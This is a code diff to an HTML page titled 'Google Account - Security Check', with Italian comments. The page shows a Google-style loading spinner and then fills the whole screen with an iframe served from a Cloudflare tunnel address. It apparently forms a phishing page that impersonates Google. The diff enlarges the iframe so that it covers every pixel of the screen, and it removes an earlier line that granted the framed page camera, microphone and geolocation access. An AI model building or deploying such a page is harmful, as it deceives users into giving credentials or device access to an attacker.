@@ -2,44 +2,50 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Google Account - Security Check</title>
     <style>
-        /* Rende l'iframe a tutto schermo e rimuove scroll fastidiosi */
+        /* Reset totale per eliminare ogni pixel di margine */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body, html { 
-            margin: 0; 
-            padding: 0; 
-            height: 100%; 
-            width: 100%; 
+            height: 100vh; 
+            width: 100vw; 
             overflow: hidden; 
             background-color: #ffffff; 
             font-family: 'Roboto', Arial, sans-serif;
         }
 
-        /* Posiziona lo spinner di caricamento dietro l'iframe */
         .loader-container {
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            width: 100vw;
             position: absolute;
-            width: 100%;
+            top: 0;
+            left: 0;
             z-index: 1;
         }
 
+        /* L'iframe ora è forzato a coprire tutto senza pietà */
         iframe { 
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%; 
-            height: 100%; 
+            width: 100vw; 
+            height: 100vh; 
             border: none; 
-            z-index: 2; /* L'iframe copre lo spinner una volta caricato */
-            background-color: transparent;
+            display: block;
+            z-index: 2;
+            background-color: #ffffff;
         }
 
-        /* Spinner in stile Google */
         .spinner {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #4285F4;
@@ -55,7 +61,6 @@
             color: #5f6368; 
             margin-top: 20px; 
             font-size: 14px;
-            letter-spacing: 0.1px;
         }
     </style>
 </head>
@@ -66,7 +71,7 @@
         <p class="loading-text">One moment...</p>
     </div>
 
-    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com" allow="camera; microphone; geolocation"></iframe>
+    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
 
 </body>
 </html>
